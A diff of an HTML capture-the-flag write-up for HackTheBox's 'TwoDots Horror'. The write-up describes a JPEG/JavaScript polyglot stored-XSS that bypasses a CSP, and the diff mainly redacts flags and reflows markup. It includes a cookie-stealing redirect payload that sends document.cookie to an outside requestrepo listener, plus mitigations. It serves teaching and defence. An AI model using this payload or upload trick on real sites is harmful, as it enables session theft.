@@ -620,7 +620,8 @@
                 <span class="challenge-platform"><i class="fas fa-flag"></i> HackTheBox CTF</span>
                 <h1 class="challenge-title">TwoDots Horror</h1>
                 <p class="challenge-subtitle">Crafting a JPEG/JavaScript polyglot to bypass CSP
-                    <code>default-src 'self'</code> and steal the admin bot's cookie through stored XSS.</p>
+                    <code>default-src 'self'</code> and steal the admin bot's cookie through stored XSS.
+                </p>
                 <div class="challenge-meta">
                     <span class="meta-badge date"><i class="fas fa-calendar"></i> 2026-02-18</span>
                     <span class="meta-badge category">Web Exploitation</span>
@@ -691,7 +692,7 @@
 
                 <pre><code>const cookies = [{
     'name': 'flag',
-    'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'
+    'value': 'HTB{REDACTED}'
 }];
 
 async function purgeData(db){
@@ -757,7 +758,8 @@ async function purgeData(db){
 
                 <ul>
                     <li>The <code>/review</code> endpoint is <strong>localhost-only</strong> — if your IP isn't
-                        <code>127.0.0.1</code>, you get redirected. Only the bot can see it.</li>
+                        <code>127.0.0.1</code>, you get redirected. Only the bot can see it.
+                    </li>
                     <li>Submitted posts must contain <strong>exactly 2 dots</strong>. Nothing more, nothing less. A
                         quirky restriction, but trivial to satisfy.</li>
                     <li>Uploaded avatars are saved using their <strong>MD5 hash as the filename</strong> — no file
@@ -821,7 +823,8 @@ if(!(dimensions.width &gt;= 120 &amp;&amp; dimensions.height &gt;= 120)) {
 
                 <ul>
                     <li><strong><code>is-jpg</code></strong> (v2.0.0): Checks <em>only</em> the first 3 bytes —
-                        <code>FF D8 FF</code>, the JPEG magic number. That's it. It doesn't parse the file at all.</li>
+                        <code>FF D8 FF</code>, the JPEG magic number. That's it. It doesn't parse the file at all.
+                    </li>
                     <li><strong><code>image-size</code></strong>: Reads JPEG segment markers to find the SOF (Start of
                         Frame) marker, which contains the image dimensions. It skips unknown segments entirely.</li>
                 </ul>
@@ -843,7 +846,8 @@ return res.sendFile(avatar);</code></pre>
                     extension → <code>application/octet-stream</code>. And this matters enormously, because Chrome
                     <em>blocks</em> scripts served with <code>image/*</code> MIME types, but <em>allows</em>
                     <code>application/octet-stream</code>. That missing <code>.jpg</code> extension is the key that
-                    unlocks everything.</p>
+                    unlocks everything.
+                </p>
 
                 <h2 id="s3">3. The Dead Ends — What Didn't Work</h2>
 
@@ -1030,7 +1034,8 @@ class EXP_JPEG:
                 <p>CSP blocks <code>fetch()</code> and <code>XMLHttpRequest</code> to external domains —
                     <code>connect-src</code> inherits <code>'self'</code>. But CSP doesn't restrict <strong>page
                         navigation</strong>. <code>document.location</code> is completely outside CSP's scope. So my
-                    exfiltration method is a simple redirect:</p>
+                    exfiltration method is a simple redirect:
+                </p>
 
                 <pre><code>document.location.href = "http://yqjiie22.requestrepo.com/?c=" + btoa(document.cookie);</code></pre>
 
@@ -1066,12 +1071,14 @@ with open('exploit.jpg', 'wb') as f:
                     <li>✅ First 3 bytes are <code>FF D8 FF</code> → passes <code>is-jpg</code></li>
                     <li>✅ SOF marker found with 120×120 dimensions → passes <code>image-size</code></li>
                     <li>✅ File saved as MD5 hash (no extension) → will be served as
-                        <code>application/octet-stream</code></li>
+                        <code>application/octet-stream</code>
+                    </li>
                 </ul>
 
                 <p>I verified by hitting <code>/api/avatar/test</code> — sure enough,
                     <code>Content-Type: application/octet-stream</code>. Not <code>image/jpeg</code>. Chrome won't block
-                    this as a script source.</p>
+                    this as a script source.
+                </p>
 
                 <h3>Step 3: Submit the XSS Post</h3>
 
@@ -1097,19 +1104,20 @@ with open('exploit.jpg', 'wb') as f:
                     <code>flag</code> cookie, visits <code>/review</code>. My post is rendered with <code>|safe</code> —
                     the script tag goes into the DOM as real HTML. Chrome loads <code>/api/avatar/test</code>,
                     interprets it as JavaScript (Latin-1 charset), and executes my payload. The bot's browser redirects
-                    to my listener.</p>
+                    to my listener.
+                </p>
 
                 <h3>Step 5: Flag Captured</h3>
 
                 <p>The incoming request on my listener:</p>
 
-                <pre><code>GET /?c=ZmxhZz1IVEJ7VW5pdDNkX2QwdHNfMGZfcDBseWdsMHR9 HTTP/1.1
+                <pre><code>GET /?c=REDACTED_BASE64 HTTP/1.1
 User-Agent: Mozilla/5.0 ... HeadlessChrome/90.0.4427.0</code></pre>
 
                 <p>Decoding the base64:</p>
 
-                <pre><code>$ echo "ZmxhZz1IVEJ7VW5pdDNkX2QwdHNfMGZfcDBseWdsMHR9" | base64 -d
-flag=HTB{Unit3d_d0ts_0f_p0lygl0t}</code></pre>
+                <pre><code>$ echo "REDACTED_BASE64" | base64 -d
+flag=HTB{REDACTED}</code></pre>
 
                 <h2 id="s7">7. Full Attack Chain</h2>
 
@@ -1138,7 +1146,7 @@ flag=HTB{Unit3d_d0ts_0f_p0lygl0t}</code></pre>
 │          │ Polyglot executes → document.location redirects bot     │
 │          │ Cookie exfiltrated to listener via URL parameter         │
 ├──────────┼──────────────────────────────────────────────────────────┤
-│ Step 6   │ Base64 decode → HTB{Unit3d_d0ts_0f_p0lygl0t}           │
+│ Step 6   │ Base64 decode → Flag captured           │
 └──────────┴──────────────────────────────────────────────────────────┘</code></pre>
 
                 <h2 id="s8">8. Why Other Approaches Failed</h2>
@@ -1211,7 +1219,8 @@ flag=HTB{Unit3d_d0ts_0f_p0lygl0t}</code></pre>
                         <tr>
                             <td><code>application/octet-stream</code></td>
                             <td>Chrome blocks scripts with <code>image/*</code> MIME types, but <em>allows</em>
-                                <code>application/octet-stream</code>.</td>
+                                <code>application/octet-stream</code>.
+                            </td>
                         </tr>
                         <tr>
                             <td><code>charset="ISO-8859-1"</code></td>
@@ -1226,7 +1235,8 @@ flag=HTB{Unit3d_d0ts_0f_p0lygl0t}</code></pre>
                         <tr>
                             <td>Timing matters</td>
                             <td>The avatar must be uploaded <em>before</em> submitting the post, or the bot loads
-                                <code>default.jpg</code>.</td>
+                                <code>default.jpg</code>.
+                            </td>
                         </tr>
                     </tbody>
                 </table>
@@ -1249,7 +1259,8 @@ flag=HTB{Unit3d_d0ts_0f_p0lygl0t}</code></pre>
                         <tr>
                             <td>Missing file extension</td>
                             <td>Append <code>.jpg</code> to uploads: <code>file.md5 + '.jpg'</code>. Ensures
-                                <code>Content-Type: image/jpeg</code>, which Chrome blocks as a script source.</td>
+                                <code>Content-Type: image/jpeg</code>, which Chrome blocks as a script source.
+                            </td>
                         </tr>
                         <tr>
                             <td>Weak JPEG validation</td>
@@ -1264,7 +1275,8 @@ flag=HTB{Unit3d_d0ts_0f_p0lygl0t}</code></pre>
                         <tr>
                             <td>Cookie without <code>httpOnly</code></td>
                             <td>Set the <code>httpOnly</code> flag on sensitive cookies to prevent
-                                <code>document.cookie</code> access.</td>
+                                <code>document.cookie</code> access.
+                            </td>
                         </tr>
                         <tr>
                             <td>No MIME enforcement</td>
